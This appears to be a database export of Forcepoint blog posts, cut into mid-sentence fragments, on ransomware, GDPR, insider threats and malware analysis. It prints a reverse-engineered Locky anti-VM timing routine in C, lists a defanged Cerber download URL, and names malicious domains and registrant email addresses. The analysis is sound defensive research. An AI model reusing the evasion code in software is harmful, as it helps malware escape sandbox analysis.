for the data, which involve more effort. In the case of ransomware, it’s simpler and easier just to demand a one-time payment from the target to unencrypt. Remarkably, some ransomware attackers have even provided a call center to help victims through the ransom payment process.\n\n\n	As I read the newspapers and my favorite online magazines, I hear of stories of businesses paying the ransom demand.  While this can potentially offer short-term relief I often find myself in front of CISOs who wish they were not in a position of having to make that tough decision – to pay or not to pay. There have been articles and podcasts telling companies their data may not be restored once ransom has been paid, but criminals they have a significant incentive.  If they don’t unencrypt when the ransom is paid, then their credibility takes a huge hit and they may kill their revenue stream. Therefore, in my opinion it’s highly unlikely that the criminal wouldn\'t unencrypt the data after receiving payment.  Their livelihood depends on them following through.\n\n\n	Our new report looks into these ransomware trends in the current threat landscape and explores the challenges and opportunities that exist, including:\n\n\n		Which ransomware should you defend against?\n	\n		Is paying the ransom a wise idea?  We discuss the payment ecosystem.\n	\n		We explain how you can defeat the ransomware authors and regain control of your data.\n\n	Ransomware is likely to be a thorn in the side of many businesses for a long as attacks remain profitable for malware authors.  Our full report is available for download from https://www.forcepoint.com/ransomware.', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-5\n');

These domains are injected as scripts into compromised websites, resulting in drive-by attacks on browsers. The domains are used as Traffic Direction Systems (TDS) which determine whether or not a target is of interest and should be sent to the malicious site or not.\n\nWhat is a TDS?\n\nA TDS is a web based gate that is able to redirect users to various content depending on who they are. A TDS is able to make a decision on where to send a user based on criteria such as their geo-location, browser, operating system, and whether or not they have been sent the malicious content already. There are many legitimate uses of TDSes, but there are also specific TDSes (Sutra, BlackOS, NinjaTDS etc.) written for malware actors.\n\nA malicious TDS will often contain blacklists of IP ranges and ASNs that are not of interest. These blacklists systems are referred to as \"anti-bot\" systems and typically include security vendors, search engines, and web scanning services. This makes it difficult for web crawlers to see the malicious content, which keeps the TDS undetected for longer. If a user is not determined to be of particular interest then they may be redirected to advertising or other forms of revenue generation.\n\n\"Realstatistics\" Gates\n\nAt the beginning of June we started seeing a prevalent redirection gate being used for exploit kits. The domain realstatistics[.]info was injected into many compromised websites:\n\n\n\nThe script on the malicious site then inserts an iFrame to an exploit kit (RIG or Neutrino) if the user is determined to be of interest.\n\nSince June 4, 2016 we have seen thousands of unique hits on this domain:\n\n\n\nWe also saw another domain realstatistics[.]pro, which began to be used at the start of July:\n\n \n\nNetwork traffic for the realstatistics[.]pro gate can be found on the Malware-traffic-analysis blog.\n\nUncovering The Infrastructure\n\nWe decide to dig a bit deeper and discovered several other domains registered by this actor:\n\n\nrealanalytics[.]info\nreal-analytics[.]info\nistatistics[.]info\nadsstat[.]info\nsiteanalytics[.]pro\nrealanalytics[.]pro\nwebstatistics[.]pro\nwebstatisticspro[.]net\nrealtds[.]info\nrealtds[.]pro\n\nWe were able to find these by pivoting off the WHOIS information using the e-mail address jo.fisher000@gmail.com. We then discovered that most of the domains use realdns[.]xyz for their name-servers, which is another attacker controlled domain.\n\nHere are 2 more e-mail addresses that have been used for registration:\n\n\njofisher000@gmail.com\naleksei.rqbakov@mail.ru\n\nThe registrant names are likely to be fake but here is a list for good measure:\n\n\nOskar Elbreht\nAleksei Rqbakov\nDmitry Kibalchik\n\nIdentifying The TDS\n\nWe found that the domains probably have a control panel located at /admin/ but we received an \"access denied\" message when trying to request the page:\n\n\n\nThis might be due to IP restrictions or maybe because we are not using the full URL to the login page.\n\nWe also saw a small debug message from realstatistics[.]pro on July 3:\n\n\n\nWorking with Kafeine, we were able to identify that this was Blackhat-TDS. Kafeine has previously written a great description of this TDS back in 2014.\n\nProtection Statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - The injected script on compromised websites is detected .\n	Stage 3 (Redirect) - The Blackhat-TDS gates are identified and blocked.\n	Stage 4 (Exploit Kit) - The exploit kit landing pages, such as RIG or Neutrino, are detected and blocked.\nForcepoint technologies are able to generically detect malicious scripts and iFrames on the web, and do not rely on having to see a threat first before implementing protection.\n\nSummary\n\nA Traffic Direction System (TDS) is a very useful tool for an attacker who wishes to restrict the distribution of malicious content. An actor running a TDS can ensure that web crawlers and security vendors are unable to see anything malicious, but real browsing users are redirected to exploits and malware. The \"realstatistics\" actor recently began to set up TDS infrastructure using the Blackhat-TDS platform, using it as a pre-filter check for sending users on to exploit kits. The actor has already compromised hundreds of websites and is actively registering new domains.', 'https://www.forcepoint.com/blog/security-labs/uncovering-malicious-traffic-direction-system-blackhat-tds\n');

The Aero.dll module is invoked from the NSIS script and is responsible for decrypting and loading the Votary.C SmokeLoader payload.\n\n\n	\n\n\n	The SmokeLoader payload is then injected into explorer.exe and execution continues from there. The malware will attempt to reach out to its C&C (reamstat[.]link) among a sea of fake requests it generates to legitimate sites too.

Locky e-mails came back in full force on 21 June, 2016 and now contain virtual machine (VM) and analysis tool countermeasures.\n\n\n	One of the new tricks involves new encryption of the payload that is downloaded by their Javascript downloaders. This prevents analysis tools from analysing the executable from the network traffic. Once decrypted, Locky now also requires a command line parameter in order to run correctly. This second technique prevents sandbox environments from knowing how to run the executable.\n\n\n	But one of the more interesting techniques exploits a tiny discrepancy between a VM and a real machine.\n\n\n	Detection of Virtualisation\n\n\n	When Locky returned on June 21, we saw that it is now using a new mechanism to detect the presence of a VM. We have not quite seen this specific method previously, although the conceptual basis is not a new one.The malware will calculate how long it takes to perform two Windows API calls, GetProcessHeap() and CloseHandle(). It will then compare the ratio of how long it took to execute the first API versus the second API. This is then compared to a known ratio of at least 1:10 that is more likely to indicate a real machine rather than a VM. On a real system, CloseHandle() should be at least 10 times quicker on average to execute when compared with GetProcessHeap(). However, due to how VM products may virtualise the Thread Environment Block (if they are not using hardware acceleration features) GetProcessHeap() may take a lot longer to execute as compared to a real machine.The APIs have been carefully chosen by the developer of the code, who clearly has a very good understanding of fundamental VM behaviour. The mechanism is not perfect however, and may both fail to detect a VM and also result in some false positives on real machines. This is somewhat mitigated by making 10 attempts to pass the ratio threshold. The Locky developers may be aware of this and willing to lose a certain percentage of real victims in order to extend their possible window in which their malware will remain undetected.\n\n\n	Reverse-Engineered Code\n\n\n	The code we found in Locky is represented below:\n\n\n/* \n   This is the Locky anti-VM code from 21 June 2016 (sample SHA1 25f8f920f946887e0fa86ea46842f8e3f4506f53)\n \n   Some VM products may behave significantly differently to a real system\n   with regards to timing of code execution.\n \n   GetProcessHeap() may take significantly longer in a VM than a real env.\n \n   Virtualised TSCs can also be problematic.\n \n   Multiple processor cores assigned to a VM may also worsen this problem.\n \n   See http://blog.badtrace.com/post/rdtsc-x86-instruction-to-detect-vms/ \n*/\n\nBOOL passVMCheck()\n{\n	unsigned __int64 tsc1;\n	unsigned __int64 tsc2;\n	unsigned __int64 tsc3;\n	int i = 0;\n \n    // Try this 10 times in case of small fluctuations\n	for (i = 0; i < 10; i++)\n	{\n		tsc1 = __rdtsc();\n \n		// Waste some cycles - should be faster than CloseHandle on bare metal\n		GetProcessHeap();\n \n		tsc2 = __rdtsc();\n \n		// Waste some cycles - slightly longer than GetProcessHeap() on bare metal\n		CloseHandle(0);\n \n		tsc3 = __rdtsc();\n \n		// Did it take at least 10 times more CPU cycles to perform CloseHandle than it took to perform GetProcessHeap()?\n		if ( ( LODWORD(tsc3) - LODWORD(tsc2) ) / ( LODWORD(tsc2) - LODWORD(tsc1) ) >= 10)\n			return TRUE;\n	}\n \n    // We consistently saw a small ratio of difference between GetProcessHeap and CloseHandle execution times\n    // so we\'re probably in a VM!\n	return FALSE;\n}\n\n\n	The Locky developers are comparing how long it takes to execute the Windows GetProcessHeap API vs the CloseHandle API. The \'normal\' (i.e. a real machine) ratio should be at least 1:10 according to whoever wrote this code. But under a VM the ratio may be a lot smaller, usually because the TIB/PEB is being software-virtualised which affects how long it takes to execute GetProcessHeap().\n\n\n	Hardware-accelerated VMs theoretically should not suffer against this trick, but some VM products handle rdtsc operations themselves and may return values that differ significantly from a real machine.', 'https://www.forcepoint.com/blog/security-labs/locky-returned-new-anti-vm-trick\n');

The headline items for organizations that collect or process EU citizen records are:\n\n\n		Organisations must notify their supervisory authority of a data breach within 72 hours\n	\n		The data subject will have the right to retract consent, request data erasure or portability\n	\n		Organisations may face fines of up to 4% of their worldwide turnover, or €20 million for intentional or negligent violations\n\n	These increased sanctions mean it is vital that this new law be fully understood by a number of key stakeholders within the organisation, and that organisations start preparing as soon as possible.\n\n\n	There are five key steps to help organisations perform a basic assessment of their current data protection strategy and any potential gaps that need filling prior to a more comprehensive view of the GDPR.\n\n\n	1. Identify\n\n\n	The first task for any organisation must be to identify whether they are considered a data controller or processor. They must review the relevant obligations these carry, such as issuing notice to citizens and maintaining relevant consent from the data subject.\n\n\n	Businesses should make it common practice to regularly review existing and new business processes to identify Personal Identifiable Information (PII). They should identify where this data resides – whether it is at-rest, in-motion and/or in-use and maintain a record of processing activities and understand how this data is protected.\n\n\n	2. Protect\n\n\n	Once PII has been identified, organisations must then sure they adequately protect this data. Encryption and access control are common control standards, but managing encrypted data across multiple business processes is a hugely difficult task.\n\n\n	Data sovereignty and data lifecycle management are key to helping businesses ensure that EU citizen data is processed and stored appropriately. In addition to this, they also need to manage data flows to approved third party processors, monitor for accidental data leakage from negligent or malicious employees and protect against data theft from external agents.\n\n\n	3. Detect\n\n\n	If an organisation does suffer a loss of data then it is vital to detect the breach and identify if PII records were lost or stolen. If a data breach has occured, the business will be required to notify the necessary authorities within 72 hours of the discovery to initiate a full investigation.\n\n\n	The investigation will focus on identifying the source and destination of the breach through event and incident information from Data Leakage Prevention (DLP) and Data Theft Prevention (DTP) tools. Data forensics will help to pinpoint the stolen data, at which time the business will be required to issue notice to any affected data subjects.\n\n\n	4. Response\n\n\n	Incident response is critical to protecting data and protecting EU citizen data. In addition to the mandatory data breach notification requirement, organisations must also ensure they have implemented an effective incident response plan. This plan must be tested to ensure that employees involved in a data breach response are familiar with the reporting process and fully understand the new legislation and communication process in order to report a breach.\n\n\n	 \n\n\n	 Picture Source (UK): Preparing for the General Data Protection Regulation, Information Commissioner\'s Office\n\n\n	5. Recovery\n\n\n	In the aftermath of a data breach businesses must ensure they maintain ongoing communication with the relevant authorities. This will ensure secondary loss factors are managed and keep affected data subjects regularly informed.\n\n\n	Summary\n\n\n	Data protection and the safeguarding of EU citizen data has always been an important requirement for organisations and the impending GDPR places even greater emphasis on the value of this data.  It is therefore more important than ever for organisations to fully understand their role and apply the appropriate security controls that allow them to identify and protect this data.  Having an established data breach plan in place will help organisations be familiar with the detect, response and recovery phases to ensure they limit the effect of the attack and have the relevant people, process and technology in place to continually deal with this new legal requirement.\n\n\n	For more information, watch the Forcepoint GDPR webcast: https://www.forcepoint.com/resources/webcasts/emea-general-data-protection-regulation-webcast\n\n\n	The final revision of the GDPR text with changes can be found here:  https://www.scribd.com/doc/307465671/GDPR-Blackline-Comparison-of-12-15-and-4-16-versions', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-7\n');

A computer science degree augmented with some criminal justice education is a great way to get started. Find a company like Forcepoint who has been supporting this mission area for more than 15 years and apply yourself to improve upon this growing career field.\n\n	\n		 What makes Forcepoint a great place to work? \n\n	\n		I’m trusted to do my job well, which means I can be creative and innovative in helping our customers manage their unique insider threat programs. And Forcepoint allows us to be involved in the management of products; we can bring customer needs and gaps in capabilities and turn them into features and enhancements on our solution roadmap. The result is satisfaction with my work, and that makes for a great job to have.\n\n	\n		What does innovation mean to you?\n\n	\n		When faced with a new challenge it’s easy to say no and feel constrained by perceived roadblocks and barriers to success when the organization is more concerned with an excel spreadsheet than customer success.

When executed, these WSFs downloaded the Cerber crypto-ransomware. Cerber has previously been seen distributed via exploit kits and over e-mail using DOC files with macros. This is the first time that we have seen Cerber distributed via the use of WSFs.\n\nE-mail Lure\n\n\n	The e-mail lures followed a convention of \"[someone@somewhere.tld] Invoice-or-bill-related-subject-line\". For example:\n\n\n	\n\n\n	The attacker has used two techniques to try and trick the user into downloading the malware. Firstly, there is a malicious attachment.  Secondly, there is a convincing looking unsubscribe link at the bottom which ends up redirecting the user to a similar ZIP file.\n\n\n	Malicious WSF Files\n\n\n	The ZIP files from the e-mails we analysed all contained another ZIP file of the same name, which in turn contained a somewhat rarely seen Windows Script File (WSF):\n\n\n	\n\n\n	WSFs are understood by Windows as an executable format that will be executed with the Windows wscript.exe utility. They may contain either JScript, VBScript, or both. These scripts can create ActiveX Objects to perform malicious activities. More about the WSF file format can be found on Microsoft\'s website at https://msdn.microsoft.com/library/15x4407c(v=VS.84).aspx.\n\n\n	The uncommon use of a double-zipped file containing a WSF may fool some security solutions that rely on machine learning and/or heuristics. Other efforts by the attacker to evade heuristics include the use of generic \"invoice\" and \"bill\" themed lures as well as including legitimate looking content and an unsubscribe link.\n\n\n	The WSF files themselves contained obfuscated JScript code such as the following:\n\n\n	\n\n\n	The samples we analysed downloaded payload from hxxp://188.225.36.90/label.bro which turned out to be the Cerber crypto-ransomware.\n\n\n	Cerber Configuration & File Encryption\n\n\n	Cerber is a highly customisable crypto-ransomware that will encrypt local files and request a payment in order to get the files decrypted. A blog from SenseCy suggests it is being sold under a ransomware-as-a-service (RaaS) model on Russian underground forums. RaaS provides actors with separation from each other so that a compromise of one actor\'s malware samples and/or infrastructure will not affect others. It also provides the malware author with additional revenue. As such, there is not one specific actor that is using Cerber but rather several actors distributing their own Cerber builds in different ways. For example, some Cerber samples are distributed via exploit kits whereas others are distributed via e-mail.\n\n\n	RC4 & RSA File Encryption\n\n\n	The malware mainly uses RC4 to encrypt each file, and each file is encrypted with a unique RC4 key. Cerber also adds a header at the start of the file which contains information such as the RC4 key that was used to encrypt it, the original file name and file system times, and a few bytes from the start of the original file. This header is then encrypted with an RSA public key that was generated when Cerber initially infected the system. When this key is generated the equivalent private key exponent is encrypted with a global RSA public key and saved in the registry. In order to decrypt the files we must be able to decrypt this registry key in order to know the RSA private key used to encrypt the file headers. From there we can see the RC4 key that was used to encrypt the file.\n\n\n	Encryption Weakness\n\n\n	The encryption schemes employed by Cerber means that it does not have to call home in order to securely encrypt files. However, after an in-depth analysis of Cerber we have determined that there are some weaknesses in the encryption implementation which would allow for partial file recovery. We are sharing our research privately with a small number of trusted partners and do not intend on releasing this information publicly.\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - The e-mail lures are detected and blocked.\n	\n		Stage 3 (Redirect) - The malicious URLs in the e-mails are detected and blocked.\n	\n		Stage 5 (Dropper File) - The WSFs are identified as malicious and blocked.\n\n	Summary\n\n\n	Cerber is just one of the new variants of crypto-ransomware that we have seen lately, but is interesting due to its ability to securely encrypt files without calling home.  The RaaS model that it can be sold under means that several actors are likely to be distributing the malware in different ways.

Breaches caused by insider threats continue to climb.\n\n\n	My first introduction to the insider threat was in 2007 when an employee at the internet company where I worked stole information on more than 90 million accounts and sold the info to a spammer. This incident not only changed my former company’s approaches to processes and technology, but also our formerly open company culture. Still, despite experiencing an insider incident firsthand, it still didn’t seem real to me. That was until a former U.S. Dept. of Energy employee pled guilty to a spear phishing attack against his fellow employees for personal profit.  I began to wonder; if a well-regarded, long-time employee with the highest level of clearance could do this, who else was capable? Are these “black swans” – random, unexpected, high impact events - truly that rare and improbable, or more common than we would imagine?\n\n\n	Then I read an article called the “Seven Profiles of Highly Risky Insiders” written by my co-worker, Bob Hansmann. Bob writes about non-malicious employees – the expected “white swan” in contrast to the perceived rareness of the “black swan” -  who make mistakes; from the know-it all’s who think security policies are for other people, to the often well-meaning convenience seekers who ignore processes to get the job done quickly.\n\n\n	When I present the seven profiles to security leaders, I ask if they have run into these kinds of employees. Not surprisingly, the answer is yes. Every organization has “white swans” and the damage from their unintentional negligence ranges from minimal (e.g. fines, limited business disruption) to severe (e.g. financial losses, lawsuits, reputational damage).\n\n\n	In cybersecurity there is an oft-used saying, “There are two kinds of companies: those who have been hacked and those who don’t know they have been hacked.” Perhaps the corollary for the insider threat is, “There are two kinds of companies, those who know the insider threat is real and those who believe it happens to other companies.”\n\n\n	When the phrase \"black swan\" originated, black swans were presumed not to exist; the term symbolized impossibility. When black swans were eventually discovered, the term transformed to signify an atypical event that in retrospect was more typical than initially imagined. Unfortunately, justifying an event in hindsight as “expected” leads to failing to understand how the event occurred and what vulnerabilities caused it, setting the state for a re-occurrence.\n\n\n	Today, like death and taxes, the insider threat is inevitable. However, like death and taxes, we’re still often taken aback by the reality.  Learning from “black swan” cyber security events is as important as preparing for the more common ones. Don’t miss an opportunity to learn from incidents that may ultimately improve your security posture, otherwise “black swans” may come home to roost.\n\n\n	For more on the insider threat:\n\n\n		Unintentional Insider Threat Infographic\n	\n		Technologies to Thwart Insider Threats\n	\n		The Cost of an Unintentional Insider Threat\n	\n		Nine Steps to Building Your Insider Threat Program\n	\n		Proactive Compliance for Insider Threat Protection', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-8\n');

Whilst Forcepoint might only be just over 90 days old, there is a rich heritage of over 20 years that brings us to where we are today as a market leader. TRITON has been leading the market as one of the industry’s first security platforms. We’ve been helping our customers to reduce the operational burden for over-stretched IT staff through the consolidation of Web and Email security with DLP into a single console.\n\n\n	Over the last year, as Websense, Raytheon Cyber Products and more recently, Stonesoft have come together, we have been working diligently to integrate the technologies these companies bring to the market. This ability to integrate new technologies into the TRITON platform is a key differentiator for Forcepoint. It’s incredibly exciting to see the results of this integration. Firstly, we have integrated the security research teams into Forcepoint Security Labs. This has resulted in the expansion in the technologies and capabilities of Forcepoint’s ACE shared security services (The power behind the protection and detection capabilities across our security platform). These advances are already benefitting existing customers using our solutions today.  Check out what our Security Labs team are saying in Forcepoint Security Labs Global Threat Report released April 26, 2016.\n\n\n	In this latest release of the TRITON portfolio (including AP-WEB, AP-EMAIL, AP-DATA & AP-Endpoint DLP), Forcepoint has expanded our integration of advanced file behavioral analysis capabilities to continue to remain at the forefront of providing market-leading advanced threat protection for our customers.\n\n\n	Integrated security means better security.\n\n\n	Integrating Web, Email and DLP provide the best protection from external attackers and insiders trying to steal data. Cyber criminals target the very same critical communication channels that our customers’ users use. By combining web and email security with DLP, Forcepoint provides better security against users from advanced attacks as well as more comprehensive protection from data theft from insiders or external attackers.\n\n\n	Business transformation needs flexible security.\n\n\n	Our consolidated management and unified policies are most effective at helping customers to safely embrace transformative technologies (like cloud, mobility and others).Forcepoint provides organizations with the flexibility to choose the most relevant deployment method of their web, email and DLP security to support the needs of the business and maintain a centralised management console to deploy consistent policies to protect users and your data across any network that they need to work. Forcepoint’s range of virtual & physical appliances, as well as ISO certified cloud based security infrastructure means protection is closest to the users and your critical data wherever it needs to be.\n\n\n	Consolidated management means faster detection and response.\n\n\n	Our industry-leading TRITON Platform goes beyond just Defending, enabling you to Detect breaches and Decide how best to Defeat the attack (What we call ‘4D Security’).\n\n\n	TRITON combines the management of Web, Email and DLP protection in one console. Pre-defined policies grouped by regulation or data type and geographical location save administration time and allow organizations to rapidly protect against data theft, as well as provide superior protection from blended attacks that cross both Web and Email.  In addition, this integration allows organizations to protect against every stage of the threat lifecycle, from initial targeted phishing emails, through to data exfiltration in hidden ‘Call Home’ channels. Integrated advanced file analysis reduces the time it takes to detect an attack. Our threat dashboards and reporting speed up the time it takes to respond to an incident in order to remediate quickly to contain an attack (i.e. get back to ‘normal’ faster).\n\n\n	The Bottom Line: Today, with the latest release (v8.2) the Forcepoint TRITON platform provides better protection from outsiders targeting users with advanced threats, and is more effective at protecting increasingly distributed data against loss or theft from insiders. The consolidated TRITON Platform reduces the burden on IT, enabling them to spend more time supporting business innovation.', 'https://www.forcepoint.com/blog/insights/forcepoint-announces-latest-generation-their-triton-4d-security-platform-helping\n');

Why modify a date and fix the typo and then refer  again?\n\n\n	What appears to be going on here, and confirmed later, is that the malware is being re-built by different people and that some are likely to be modifying some of the details to avoid detection by standard AV techniques.\n\n\n	Searching for Text.  If we take the full text \"Copyright 1999-2012 Firefox and Mozzilla developers. All rights reserved.\" and search using Google we get 17 hits.  All but one of these hits is relating to reports generated by automated malware analysis tools.  The odd-one-out in this case is a link to a Tor site:\n\n\n	\n\n\n	Helpful but hardly humble about their capability, our author\'s landing page then directs us their shop-front on a Tor market place:\n\n\n	\n\n\n	And here we find his page for the JIGSAW malware kit:\n\n\n	\n\n\n	How Much?  $139 dollars.  And what does a purchaser get for the equivalent of flipping burgers for 20 hours?  This buys the source code for JIGSAW written in C#.  The seller is kind enough to provide a guide to building and deploying the malware which is of course available online.  Of course, if we use a tool such as DotPEEK we can decompile the C#/.NET Assembly back to source code without any trouble.\n\n\n	Sales Figures.  The malware author appears to have sold 24 times since 04/MAR/2016.  At $139 per customer this $3,336.  On the feedback page for the malware he has 8 separate and glowing reviews:\n\n\n	\n\n\n	Unfortunately for the buyers, the return on investment seems to be abysmally low. Forcepoint Security Labs extracted the ransom Bitcoin addresses for 4 samples. It was found that in 2 cases the extortionist received no ransom payment at all, in one case they received $1 worth of Bitcoin (which may have been merely a test) and the most successful one received a total of $89 worth of Bitcoin.\n\n\n	Building the Software. The author has kindly documented how to configure and build the software:\n\n\n	\n\n\n	But here in lies a significant problem.  For all the guidance and point-and-click approach to building the software the author does not provide advise on stripping out text from the executable malware produced.  Any entry-level malware analyst knows to check for the build strings in an executable.  Quite often, when built in visual studio, a program will have the full path name to the build project.  Here are some examples:\n\n\nC:\\Users\\Monument\\Desktop\\mean\\BitcoinBlackmailer\\BitcoinBlackmailer\\obj\\Release\\BitcoinBlackmailer.pdb\nC:\\Users\\xx\\BitcoinBlackmailer\\BitcoinBlackmailer\\obj\\Release\\BitcoinBlackmailer.pdb\nc:\\users\\***********\\documents\\visual studio 2015\\Projects\\BitcoinBlackmailer\\obj\\Release\\BitcoinBlackmailer.pdb\nC:\\Users\\***********\\Music\\New folder\\BitcoinBlackmailer\\obj\\Release\\BitcoinBlackmailer.pdb\n\n\n	As can be seen from above, some customers are smart enough to know to use a generic account name on the machine they are doing bad things with.  Some however, are not.  Real names appear in some examples and allow investigators to start to bracketing-in on the bad-guys actually running the extortion scams.\n\n\n	Observations\n\n\n	A genius malware author this is not, the use of C#/.NET makes it trivial to reverse engineer and analyse.  At the current rate, by selling the source code for the software is not going to generate nearly enough money to pay for much, let alone that sports car.  Finally, the customers who have purchased this kit are non too smart either, even with the documentation available some have left their names in the malware.  With the Internet come the darker edges accessible via Tor.  Within the Tor anyone,  including our malware author, A.K.A \'funWithCode\' can set-up shop and peddle their wares to like minded individuals.\n\n\n	This could have been funny if it were not true.  A mediocre and greedy techie writes a 2nd rate piece of malware that is designed to scare people into parting with their money.  He (or she) sells it to a group of customers who are not that techno-savy but are equally greedy and devoid of any morals. Hardly a happy story.  But, if we needed an illustration of bad programmers selling to somewhat inept \'wannabe\' criminals via the unregulated \'dark web\', this is probably good enough for now.', 'https://www.forcepoint.com/blog/security-labs/jigsaw-some-missing-pieces\n');

Interestingly, the attacker became aware of the Nagios system only after they \"spied\" on the sysadmins (see below).\n\n\n	Separation of Networks but Know your Network! This attack was possible because backup and management networks that should have been segregated, were not.  Separation of operational and management networks is a useful technique for protecting infrastructural, especially when the management network requires administrative privileges.   In this attack, the adversary was able to interrogate and dump the email server backup images.\n\n\n	Watch and Protect the Privileged.  We often say that one of the greatest challenges is monitoring those with privileged accounts.  Many organizations, especially government related require security clearances to protect from the \"insider threat\".  However, what this incident teaches us that once in, the bad guys make a bee-line for the sysadmins to  monitor their activities in order to gain greater knowledge and understanding of the Company and it\'s infrastructure  There is somewhat of a mind-set change here, should we not be monitoring the privileged users and their workstations?  Not because we do not trust them, but for their own protection and to ensure they are too are not  being watched by network sniffers, key-loggers and similar?\n\n\n	Egress Monitoring.  One final observation is that a lot of data was ex-filtrated.  Why was this not noticed?  This is hardly uncommon in attacks where intellectual property is the target.  Implementing a Data Theft or Data Loss Prevention (DTP/DLP) solution and monitoring will lessen the likelihood and potential impact of this type of attack.', 'https://www.forcepoint.com/blog/security-labs/italian-job-hacking-team-exposed\n');

The article did not say the former employee exported the contacts from Outlook when he was terminated by the Nuclear Regulatory Commission in 2010 but this is certainly one way he might have accumulated a valuable list of current NRC employees in specific positions in agency programs and operations. According to the 2015 Ponemon report “The Unintentional Insider Risk in United States and German Organizations” of the U.S. organizations surveyed, 86% assessed it likely their users would fall victim to spear-phishing attempts. The odds were in the former Energy Department employee’s favor the attack would be effective.\n\n\n	Employees leaving their job often take data with them – we are well past arguing that point. An article at PCWorld even suggested that your users could create a “Digital Life Raft” containing contacts, important emails, and recent work files ready in a special folder on their computer desktop in case of a sudden departure from their job. The suggestion does include a warning that employees could prepare “while respecting your company’s intellectual property rights” in a warning. Uh, okay, so should we expect your agency’s employees to be knowledgeable enough to make that decision?\n\n\n	Besides maybe replacing an agency iPhone or supplying a user with a new laptop, there are few good reasons for a user to use the Outlook import/export wizard to export his/her contacts lists to a flat file on the desktop. Does your agency’s risk management plans include looking at these events in context to decide if this activity is reasonable? The National Insider Threat Policy and Minimum Standards for Executive Branch Insider Threat Programs includes requirements for this kind of issue.\n\n\n	There are a few questions to ask first. Are Outlook contacts your agency’s intellectual property? Are LinkedIn contacts trade secrets?    Attorneys (and I am not one and this is not legal advice) across the county continue to explore these issues in the courts but your agency’s employees are probably not reading legal journals in their spare time to keep track of the developments. So what can you do?\n\n\n		Develop a policy. An agency policy on the handling of internal and external contacts might flow down into contracts, non-disclosure agreements, and network interconnection agreements.\n	\n		Train. Educate your users on the policy so they understand the proprietary nature of these contacts and remind them you have a right to audit their use of the agency’s information systems to verify compliance with the policy.\n	\n		Monitor employee compliance with your policies. Tune your user activity monitoring and data leakage prevention solutions to detect policy violations.  Can your solutions detect this activity and provide the context necessary to take appropriate action?\n	\n		Take action. Follow through on policy enforcement and don’t forget to feed the results back into your policies, processes, and training. You’re going to find ways to enable your employees to work smarter and safer.\n\n	Forcepoint’s 4D approach to security – Defend, Detect, Decide, Defeat – protects your agency against determined adversaries and uninformed or untrained users. Comprehensive solutions that monitor data and human behavior are critical for organizations to effectively detect these kinds of risky activities and to decide if the actions are a threat. Implement some auditing surrounding the handling of email contacts.

Ask Iceland’s Former Prime Minister', 'Susan HelmickSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'By Doug Copley, Forcepoint Deputy CISO\n\n\n	It’s hard to look at any tabloid or newspaper today and not see some sort of repercussion from the infamous “Panama Papers” breach – one of the largest leaks of confidential data in history. But why is this pertinent to public and private entities, and what if anything, should companies be doing differently to protect themselves?\n\n\n	Consistent with other major data leaks, it’s unclear at this point in time exactly how the data was leaked, and Ramon Fonseca, founding partner of the Panamanian law firm at the center of the story, Mossack Fonseca, says the firm is a victim of hacking and this was not a leak from someone inside the company. What’s significant about the Panama Papers is that the implications of the exposed information has global reach. As best we know right now, the information “revealed links to shadowy offshore financial transactions by world leaders2” which included some 140 politicians from more than 50 countries.  All of these activities were transacted through Mossack Fonseca, a law firm in Panama which specializes in setting up offshore tax shelters for the elite. So far, and less than one week from disclosure, there have been three leaders who have stepped down after this information became public: the prime minister of Iceland Sigmundur David Gunnlaugsson resigned, Michael Grahammer, the CEO of Austrian lender Hypo Landesbank Vorarlberg resigned, and Gonzalo Delaveau, the president of Transparency International in Chile, resigned. Another important point from this story is that no one has accused anyone mentioned in the disclosure of having broken any law.\n\n\n	This was no ordinary leak, and the ability for journalists to maintain secrecy until the official release was quite astonishing. According to the International Consortium of Investigative Journalists, there were some 11.5 million documents leaked from the Panamanian law firm Mossack Fonseca roughly a year ago. The Panama Papers leak represented a joint, coordinated effort by 376 reporters at more than 100 news outlets in nearly 80 countries. The make-up of the records disclosed was outlined by Süddeutsche Zeitung as follows3:\n\n\n	\n\n\n	What Caused This, and What Can My Company Do?\n\n\n	Companies around the globe should be asking themselves “how did such a mass amount of records get exposed, and how could we prevent a similar outcome with our information?” In the Panama Papers exposure, Mossack Fonseca indicates this particular exposure was the result of a hack. Other similar data breach stories in the headlines have been caused by insider threats. A strong cyber security program using multiple layers of defense is key to defending against both internal and external threats, but let’s take a closer look at how insider threats can cause significant data loss, and outline what companies can do to prevent them.\n\n\n	Data from a 2014 Ponemon Institute study1 indicated that 88% of organizations recognized that insider threats are cause for alarm, yet less than 40% actually had budget for insider threat protections, and only 16% were very confident they had visibility to privileged user access. So if insider threats are a known concern for companies, why does it appear so few companies are addressing it?\n\n\n	What is an insider threat?  Depending on which expert or analyst you speak to, there are generally three types of insider threats: (1) Malicious insiders, (2) Accidental insiders and (3) Inadvertent insiders.  Let’s look at each to understand the seriousness of the threat.\n\n\n		\n			Malicious Insider – The malicious insider is most commonly recognized as the most significant threat among the three.  This refers to the individual who may be unhappy in their job, may be angry at their manager or the company because they were passed over for a raise or promotion, or may have philosophical or ideological differences with the company or its leadership.  It may also be an employee who is encountering deep financial difficulties. These individuals purposely cause physical harm to the company or its employees or steals data to use in malicious ways for either personal gain or to harm the company. The actions are taken with intent, and in most cases knowingly violate company policies and direction to do it.\n	\n	\n		\n			Accidental Insider – Like the malicious insider, the accidental insider actually takes action to transmit or store data and in most cases understands the actions they have taken.  Unlike the malicious insider, however, this user has no intent to cause harm to the company and doesn’t take action looking for personal gain. In most situations, the accidental insider is just trying to do their job the way they know how to do it, but doesn’t realize that they are putting data at risk in the process. Examples could be someone transmitting sensitive data to other companies insecurely because that’s always been the established process, or someone who clicks “Reply-All” to an email and mistakenly sends sensitive company information to others on the distribution list who are outside the company and not authorized to view that information. The exposure in these cases is typically accidental.\n	\n	\n		\n			Inadvertent Insider – Sometimes viewed as a subset of the accidental insider, the inadvertent insider is someone who is a threat to the company, but has no knowledge that they are a threat and doesn’t take action to transmit data outside the company. They may be someone working on their laptop at home in the evening, who opened a file infected with malware and spread it to their organization’s network or files. They could also be someone who clicked on a phishing attack and revealed their login credentials or opened a backdoor to their PC where hackers or others could use their PC or credentials to steal data from the 